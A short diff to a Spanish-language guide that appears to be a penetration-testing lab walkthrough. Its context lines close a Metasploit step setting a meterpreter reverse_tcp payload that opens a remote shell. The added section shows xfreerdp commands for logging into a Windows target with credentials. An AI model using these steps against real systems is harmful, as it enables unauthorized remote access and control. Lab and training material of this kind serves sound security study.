@@ -84,3 +84,17 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST <TU_IP>
 run
 ```
+
+### 4.3 Acceso remoto con cliente RDP (xfreerdp)
+
+Si ya tienes las credenciales y sólo quieres conectarte remotamente a la máquina Windows, puedes usar **xfreerdp** desde Linux:
+```
+xfreerdp /u:<USUARIO> /p:<CONTRASEÑA> /v:<IP_OBJETIVO>
+````
+
+Ejemplo completo:
+```
+xfreerdp /u:administrador /p:contraseña123 /v:192.168.1.1
+```
+
+
